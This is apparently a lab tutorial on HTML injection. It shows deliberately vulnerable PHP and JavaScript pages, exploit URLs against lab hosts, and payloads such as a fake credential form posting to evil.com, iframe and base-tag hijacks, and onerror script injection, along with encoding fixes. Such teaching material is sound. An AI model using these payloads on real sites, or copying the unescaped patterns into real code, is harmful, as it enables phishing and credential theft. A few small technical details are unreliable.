# HTML Injection Vulnerability Code
---
## Given html input by :
1) url  parameter
2) hidden parameter
3) headers

---
## What is HTML Injection?
---
**HTML Injection** is a web security vulnerability that occurs when an application embeds user input directly into a web page's HTML structure without proper sanitization or encoding. This allows an attacker to inject arbitrary HTML tags or content, which the browser will interpret and render as part of the page.

## How Does HTML Injection Happen?
***
HTML injection is possible whenever a web application takes untrusted data (such as content from a form, query parameter, or HTTP header) and inserts it into an HTML page without filtering out or encoding HTML special characters.

### Example Vulnerable Code

```php
<?php
    if (isset($_REQUEST['user'])) {
        echo "<h2>" . $_REQUEST['user'] . "!! </h2>";
    }
?>
```
If the attacker sets `user` to `<iframe src="http://malicious.com"></iframe>`, the browser will render the injected iframe.

## Consequences of HTML Injection
***
*   **Page Defacement:** Attackers can change how the website looks for users.
*   **Phishing:** Malicious forms or messages can be injected to trick users into revealing sensitive data.
*   **Browser Exploitation:** Injected scripts or objects may target browser vulnerabilities.
*   **Content Spoofing:** Attackers can display fake information to manipulate or deceive users.

## Common Scenarios
***

| Context         | Example Attack                                             | Impact                        |
| :-------------- | :--------------------------------------------------------- | :---------------------------- |
| GET/POST inputs | `user=<h1>Hacked</h1>`                                     | Displays fake/injected header |
| Form fields     | `<input name="name" value="<?php echo $_GET['name']; ?>">` | Breaks HTML or injects code   |
| URL parameters  | `<iframe src="<?php echo $_GET['url']; ?>">`               | Loads malicious sites         |
| HTTP Headers    | `User-Agent: <img src=x onerror=alert(1)>`                 | Causes JavaScript execution   |

## Real-World Example
***
### Example: iFrame Injection

```php
<?php
    $url = $_GET['url'];
?>
<iframe src="<?php echo $url; ?>" width="800px" height="500px"></iframe>
```
**Attack:**
`?url=https://evil.com/`

Any site can be loaded within the page, leading to clickjacking or phishing.

## Why is HTML Injection Dangerous?
***
*   **Trust Exploitation:** Users may trust malicious content if it appears within a legitimate site.
*   **Data Theft:** Attackers can steal credentials through fake forms or hidden fields.
*   **Further Exploits:** Combined with browser bugs, could achieve script execution.

## Prevention
***
*   **Sanitize user input:** Remove or encode HTML special characters (`<`, `>`, `&`, `"`, `'`).
*   **Context-aware output encoding:** Use functions like `htmlspecialchars()` or `htmlentities()` in PHP.
*   **Whitelist values:** For URLs or other dynamic content, only permit trusted, predefined values.
*   **Avoid inserting untrusted input directly into HTML, attributes, or script contexts.**

## References
***
OWASP Web Security Testing Guide
	https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/03-Testing_for_HTML_Injection

HTML Character Reference
	http://rabbit.eng.miami.edu/info/htmlchars.html

---
## Vulnerable Example: html-injection.php

```python
html-injection.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection</title>
</head>
<body>
    <h1>Html Injection</h1>
    <?php
        if (isset($_REQUEST['user'])) {
            echo "<h2>" . $_REQUEST['user'] . "!! </h2>";
        }
    ?>
    </body>
</html>
```

> **Exploit Example:**
> Open:
> http://192.168.1.29/webpentest/html-injection.php?user=%3Ch1%3EInjected!%3C/h1%3E
> The injected text is rendered as HTML.

## Basic Login Form Example
***
```html
<h1>Please Login</h1>
<form action="#" method="POST">
    User Name: <input type="text" name="username"><br />
    Password: <input type="password" name="password"><br />
    <input type="submit" value="login">
</form>
```

---
## Vulnerable Example: html-injection2.php

```python
html-injection2.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection 2</title>
</head>
<body>
    <h1>Please Login</h1>
    <form action="#" method="POST">
        <input type="hidden" name="sessionid" value="<?php echo $_REQUEST['sessionid']; ?>">
        User Name: <input type="text" name="username"><br />
        Password: <input type="password" name="password"><br />
        <input type="submit" value="login">
    </form>
</body>
</html>
```

> **Exploit Example:**
> http://192.168.1.45/webpentest/html-injection2.php?sessionid=1234%22%3E%3Ch1%3EHello!%3C/h1%3E
> The input escapes the attribute context and injects HTML.

---
## Vulnerable Example: html-injection3.php
***
```python
html-injection3.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection 3</title>
</head>
<body>
<?php
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $user_ipadd = $_SERVER['REMOTE_ADDR'];
    $user_port_no = $_SERVER['REMOTE_PORT'];
    $user_ipadd2 = isset($_SERVER['HTTP_X_FORWARDED_FOR']) ? $_SERVER['HTTP_X_FORWARDED_FOR'] : "";
    $user_ipadd3 = isset($_SERVER['HTTP_X_PROXYUSER_IP']) ? $_SERVER['HTTP_X_PROXYUSER_IP'] : "";
    $user_http_referer = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : "";
?>
    <h1>User Info</h1>
    <table>
        <tr>
            <th>User Agent</th>
            <th>User IP Add</th>
            <th>User Port No</th>
            <th>USER REFERER</th>
        </tr>
        <tr>
            <td><?php echo $user_agent; ?></td>
            <td><?php echo $user_ipadd; ?></td>
            <td><?php echo $user_port_no; ?></td>
            <td><?php echo $user_http_referer; ?></td>
        </tr>
    </table>
    <?php echo $user_ipadd2; ?><br />
    <?php echo $user_ipadd3; ?>
</body>
</html>
```

---
## Blacklist-Based Filtering: html-injection-black-list.php

```python
html-injection-black-list.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection Black List</title>
</head>
<body>
    <h1>Html Injection Black List</h1>
    <?php
        if (isset($_REQUEST['user'])) {
            $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
            echo "<h2>" . $user_name . "!! </h2>";
        }
    ?>
</body>
</html>
```
**Alternative version with urldecode:**
```php
echo "<h2>" . urldecode($user_name) . "!! </h2>";
```

## Blacklist POST Example: html-injection-black-list-post.php

```python
html-injection-black-list-post.php
```

```html
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection Black List</title>
</head>
<body>
    <h1>Html Injection Black List</h1>
    <form action="html-injection-black-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>
    <?php
        if (isset($_REQUEST['user'])) {
            $user_name = preg_replace("/<|>/", "", $_REQUEST['user']);
            echo "<h2>" . $user_name . "!! </h2>";
        }
    ?>
</body>
</html>
```
 # through encoding hum kar salkte hai kyunki get parameter se gai value server decode karta hai post se nhi---
## Whitelist Examples
***
## html-injection-white-list.php
***
Below is your provided code, updated only for layout consistency and readability. The **HTML injection vulnerability remains** because the regex does not fully validate input (it only checks if at least one allowed character is present anywhere in the input), so injection is still possible.

```python
html-injection-white-list.php
```

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection White List</title>
</head>
<body>
    <h1>Html Injection White List</h1>

    <form action="html-injection-white-list.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
        if (isset($_REQUEST['user'])) {

            $user_name = $_REQUEST['user'];

            // This regex only checks for the presence of at least one allowed character.
            // Inputs with both allowed and unallowed characters will still pass through.
            if (!preg_match('/[a-z\d\.\-\_]/i', $user_name)) {
                die("Don't try to Inject Code");
            } else {
                // No sanitization or escaping; still vulnerable to HTML injection!
                echo "<h2>" . $user_name . "!! </h2>";
            }
        }
    ?>

</body>
</html>
```

**Vulnerability explanation:**
*   The regular expression `/[a-z\d\.\-\_]/i` will match as long as there is at **least one** allowed character in the input, not that the **entire** input is only allowed characters.
    *   Input like `<h1>Injected</h1>` will **pass** the check because `h`, `i`, and `n` are in the allowed set.
*   No output escaping is done before echoing the value in the `<h2>`, so HTML code in the input is rendered.
*   Thus, an attacker can still inject arbitrary HTML into the output.

---
## html-injection-white-list2.php
***
```python
html-injection-white-list2.php
```

Below is your provided code, updated for whitespace, indentation, and readability only.

**The vulnerability is preserved.**

The regular expression used does NOT fully validate that the entire input contains only allowed characters, so HTML injection remains possible.

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection White List - 2</title>
</head>
<body>
    <h1>Html Injection White List - 2</h1>
    
    <form action="html-injection-white-list2.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
        if (isset($_REQUEST['user'])) {
            $user_name = $_REQUEST['user'];

            // This regex only checks if the first character is allowed.
            // Any subsequent characters can be anything, so input like "<h1>Injected</h1>" will pass if it starts with a letter.
            if (!preg_match('/^[a-z\d\.\-\_]/i', $user_name)) {
                die("Don't try to Inject Code");
            } else {
                // No output sanitization: this is still vulnerable to HTML injection!
                echo "<h2>" . $user_name . " !! </h2>";
            }
        }
    ?>
</body>
</html>
```

*   The regular expression `/^[a-z\d\.\-\_]/i` only checks whether the **first character** is in the allowed list (`a-z`, `0-9`, `.`, `-`, or `_`).
*   Any characters AFTER the first can be anything—including HTML tags or other injection payloads.
    *   Example: `A<script>alert(1)</script>` will pass the check.
*   The value is printed directly inside `<h2>` without encoding or sanitization.

An attacker can submit a payload that starts with an allowed character and inject arbitrary HTML into the page, maintaining the vulnerability as requested.

---
## html-injection-white-list3.php
***
```bash
vim html-injection-white-list3.php
```

**The vulnerability is preserved.**

However, this version uses a stricter regular expression, which **only allows letters, digits, dot, dash, and underscore** throughout the whole input (`/^[a-z\d\.\-\_]*$/i`).

So basic HTML Injection via angle brackets (`<` and `>`) is blocked, but it is still important to note that the code does not perform output encoding or escaping.

```php
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection White List - 3</title>
</head>
<body>
    <h1>Html Injection White List - 3</h1>

    <form action="html-injection-white-list3.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
        if (isset($_REQUEST['user'])) {

            $user_name = $_REQUEST['user'];

            // This regex only allows a-z, 0-9, dot, dash, and underscore, any length (including empty string).
            if (!preg_match('/^[a-z\d\.\-\_]*$/i', $user_name)) {
                die("Don't try to Inject Code");
            } else {
                // No output sanitization: printing directly in HTML context.
                echo "<h2>" . $user_name . " !! </h2>";
            }
        }
    ?>
</body>
</html>
```

### Vulnerability Analysis

*   **Only these characters are accepted**:
    *   `A-Z, a-z, 0-9, _, -, .`
*   **No output encoding**:
    *   The code echoes `$user_name` directly inside an HTML element.
*   **Potential risk:**
    *   Angle brackets are **not** allowed, so basic HTML injection using tags like `<script>` or `<h1>` is blocked.
    *   Other forms of injection (like JavaScript event attributes or Unicode tricks) are also mostly prevented due to character restrictions.
    *   If the allowed character set is later expanded, or additional vectors are possible depending on browser or context, risk may still exist.

*   **Best practice note:**
    Even if direct HTML injection is not possible here, encoding output is always recommended, especially as code changes may unintentionally weaken validation.
---
## Vulnerable Code Review: Html Injection White List - 4 (htmlspecialchars)

```python
html-injection-white-list4.php
```

Below is your provided code, updated for formatting, readability, and annotations.
**The use of `htmlspecialchars()` prevents HTML injection via typical payloads (like `<script>`, `<h1>`, etc.)** by encoding special HTML characters, but to match your request, the code logic is left unchanged.

```php
<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection White List - htmlspecialchars</title>
</head>
<body>

    <h1>Html Injection White List - 4</h1>

    <form action="html-injection-white-list4.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {

        // htmlspecialchars converts special HTML characters to entities
        $user_name = htmlspecialchars($_REQUEST['user']);

        // Output is safely encoded for the HTML context
        echo "<h2>" . $user_name . " !! </h2>";
    }
    ?>

    <!--
    
    htmlspecialchars

    Array
    (
        ["] -> &quot;
        [&] -> &amp;
        [<] -> &lt;
        [>] -> &gt;
    )

    &lt;h1&gt;Hi&lt;/h1&gt;
    
    -->
</body>
</html>
```

---

**Explanation:**

*   The function `htmlspecialchars()` converts `<`, `>`, `&`, and `"` into their HTML-safe equivalents (`&lt;`, `&gt;`, `&amp;`, `&quot;`)
*   Any user-supplied HTML code (e.g. `<h1>Hi</h1>`) will appear as text, not as rendered HTML.
*   ▼ This is an example of **output encoding**, which is the recommended way to mitigate HTML injection.

**Notes:**

*   This code is effectively **NOT vulnerable to standard HTML injection** because of the use of `htmlspecialchars()`.
*   If you comment out or remove the `htmlspecialchars()` call, the code would become vulnerable again.

---
## Code Review: Html Injection White List - 5 (htmlentities)

Below is your provided code, updated only for formatting and readability.
The use of `htmlentities()` on user input encodes all applicable characters to their HTML entity equivalents, preventing rendered HTML and thus mitigating HTML injection for standard payloads.

```
vim html-injection-white-list5.php
```

```php
<!DOCTYPE html>

<html>
<head>
    <meta charset="utf-8">
    <title>Html Injection White List - htmlentities</title>
</head>
<body>

    <h1>Html Injection White List - 5</h1>

    <form action="html-injection-white-list5.php" method="POST">
        User Name: <input type="text" name="user"><br />
        <input type="submit" value="login">
    </form>

    <?php
    if (isset($_REQUEST['user'])) {
    
        // htmlentities converts special HTML chars (and others) to HTML entities
        $user_name = htmlentities($_REQUEST['user']);
        
        // Output is shown as plain text, NOT interpreted as HTML
        echo "<h2>" . $user_name . " !! </h2>";
    }
    ?>

    <!--
    
    htmlentities

    Array
    (
        ["] -> &quot;
        [&] -> &amp;
        [<] -> &lt;
        [>] -> &gt;
        [ ] -> &nbsp;
        [¡] -> &iexcl;
    )

    Example: &lt;h1&gt;Hi&lt;/h1&gt; will appear as "<h1>Hi</h1>"
    
    -->
    </body>
    </html>
```

---

**Explanation**

*   `htmlentities()` converts **all** applicable characters (including `<`, `>`, `&`, `¡` and more) to their corresponding HTML entity codes, e.g. `<` becomes `&lt;`.
*   Any HTML tags submitted by a user (such as `<script>`) will **not** be executed or rendered as HTML, but displayed as text.
*   This is a form of **output encoding**, which is the standard way to prevent HTML injection.

**Note:**

*   With `htmlentities()`, this example is **NOT vulnerable to regular HTML injection.**
*   Removing or commenting out the `htmlentities()` call would reintroduce the vulnerability.

---
## 1. JavaScript `innerHTML` Vulnerability
***
When using JavaScript to directly insert user input into HTML using `innerHTML`, any malicious HTML in the input will be rendered unescaped.

```html
<!-- index.html -->
<div id="welcome"></div>
<script>
    // Reads the "user" value from the URL (e.g., ?user=John)
    var user = location.search.split('user=')[1];
    document.getElementById('welcome').innerHTML = "Hello, " + user;
</script>
```

**Attack URL Example:**
`https://example.com/index.html?user=<img src='x' onerror='alert(1)'>`
This will execute arbitrary injected HTML or JavaScript within the page context.

## 2. JavaScript `document.write()` Vulnerability
User input included in a document using `document.write()` also enables HTML injection.

```html
<script>
    var user = location.search.split('user=')[1];
    document.write("<h1>Hello, " + user + "</h1>");
</script>
```

**Attack URL Example:**
`https://example.com/page.html?user=<h2>Injected!</h2>`
The page will display the injected header in place.

## 3. Fake Form Injection for Data Theft
If user input is echoed unescaped in a web page, an attacker can inject a fake form to phish credentials from users.

```php
<?php
// Suppose GET/POST 'msg' is printed on a site
if (isset($_GET['msg'])) {
    echo "<div>" . $_GET['msg'] . "</div>";
}
?>
```

**Attack Payload Example:**
`?msg=<form action='http://evil.com' method='POST'><input name='user'><input type='submit'></form>`
A victim sees a fake form, potentially entering sensitive data unknowingly.

## 4. Injecting `<base>` Tag to Hijack Relative URLs
If input is not sanitized and inserted into the page header or body, injecting a `<base>` tag can change the behavior of all relative URLs.

```php
<?php
// Suppose 'custom' is concatenated into the HTML
echo "<html><head>" . $_GET['custom'] . "</head><body> ... ";
?>
```

**Attack Example:**
`?custom=<base href='http://malicious.site2/'>`
Now, form submissions, script includes, and links on the page can be hijacked to a malicious site.

## 5. Message Board Vulnerability
A classic example: a message board where the posted message is rendered without escaping.

```php
<?php
// Unsafe posts are inserted into the page
echo "<b>" . $_POST['username'] . "</b>: " . $_POST['message'] . "<br>";
?>
```

**Attack Example:**
Message: `<b>Hacked!</b><iframe src="http://evil.com"></iframe>`
This allows embed of arbitrary, potentially harmful content.

## 6. Exploiting HTML Injection in Email Templates
If user input is not sanitized in dynamically generated emails, malicious HTML can be sent to recipients.

```php
$email_body = "Hello " . $_POST['name'] . ", welcome!";
mail($to, "Welcome", $email_body);
```

**Attack Example:**
POST `name=<img src="x" onerror="alert('XSS')">`
The malicious payload executes in an HTML-supporting mail client.

## Key Takeaways
***
*   Unescaped user input in `HTML`, `JS`, or even email templates is dangerous.
*   HTML injection can be exploited for content defacement, phishing, session/cookie theft, or redirection to malicious sites.
*   Always sanitize or properly encode user-provided content before rendering.

---
## **Difference: htmlentities() vs htmlspecialchars() in PHP**

Both `htmlentities()` and `htmlspecialchars()` are PHP functions used to encode special characters for safe HTML output, but they differ in how much they encode and their intended use cases.

---

**1. htmlspecialchars()**
*   **Purpose:** Converts (escapes) **only** a subset of special characters (HTML entities) to their corresponding HTML codes.
*   **Main characters escaped:**
    *   `<` becomes `&lt;`
    *   `>` becomes `&gt;`
    *   `&` becomes `&amp;`
    *   `"` becomes `&quot;`
    *   (optionally) `'` becomes `&#039;` (if `ENT_QUOTES` flag is used)

**Example**
```php
echo htmlspecialchars("<b>hello & 'world'</b>");
// Output: &lt;b&gt;hello &amp; 'world'&lt;/b&gt;
```

**2. htmlentities()**
*   **Purpose:** Converts **all** characters that have a corresponding HTML entity to their entities, including all those covered by `htmlspecialchars()`, PLUS additional ones (e.g., characters with accents, ©, ™, non-ASCII, etc.).
*   **Encodes much more:** Useful for internationalization or when displaying arbitrary user content as literal text.

**Example**
```php
echo htmlentities("© 2025 <b>hello ' & 'world'</b>");
// Output: &copy; 2025 &lt;b&gt;hello &#039; &amp; &#039;world&#039;&lt;/b&gt;
```

---

**Summary Table**

| Function | Escapes minimal HTML? | Escapes all entities? | Typical Use |
| :--- | :--- | :--- | :--- |
| `htmlspecialchars` | Yes | No | User input in HTML context |
| `htmlentities` | Yes | Yes | All content as plain text |

**When to Use Which?**

*   Use `htmlspecialchars()` when you only need to convert the essential characters that pose a risk for HTML injection (most common for echoing user input into HTML).
*   Use `htmlentities()` when you want to encode the text as literally and safely as possible in HTML, including all special characters and symbols.

In most secure web applications, `htmlspecialchars()` is sufficient for user input unless you must show ALL user data (including international or symbol characters) literally.

**Reference**

*   [PHP: htmlspecialchars - Manual](https://php.net/htmlspecialchars)
*   [PHP: htmlentities - Manual](https://php.net/htmlentities)

**In summary:**

- `htmlspecialchars()` -> basic HTML safety
- `htmlentities()` -> maximum encoding for all entities

Both help prevent HTML injection and XSS when used for outputting user data.

---
## **HTML Escaping Functions and Their Encoded Characters**

|Language|Function Name|Encoded Characters|
|---|---|---|
|**PHP**|`htmlspecialchars()`|`<`, `>`, `&`, `"`, `'` (if `ENT_QUOTES`)|
|**PHP**|`htmlentities()`|`<`, `>`, `&`, `"`, `'`, and all HTML entities (e.g. `© → &copy;`)|
|**Python**|`html.escape()`|`<`, `>`, `&`, `"`|
|**Java**|`StringEscapeUtils.escapeHtml4()`|`<`, `>`, `&`, `"`, `'`, and all HTML entities|
|**JavaScript**|`he.encode()`|`<`, `>`, `&`, `"`, `'`, and all HTML entities|
|**Ruby**|`ERB::Util.html_escape()`|`<`, `>`, `&`, `"`, `'`|
|**Go**|`template.HTMLEscapeString()`|`<`, `>`, `&`, `"`|
|**C#**|`WebUtility.HtmlEncode()`|`<`, `>`, `&`, `"`, `'`|
|**C#**|`HttpUtility.HtmlEncode()`|`<`, `>`, `&`, `"`, `'`|
|**Perl**|`HTML::Entities::encode_entities()`|`<`, `>`, `&`, `"`, `'`, and all HTML entities|
|**Rust**|`ammonia::clean()` (sanitization)|Removes or escapes unsafe tags and attributes (not just characters)|

---
---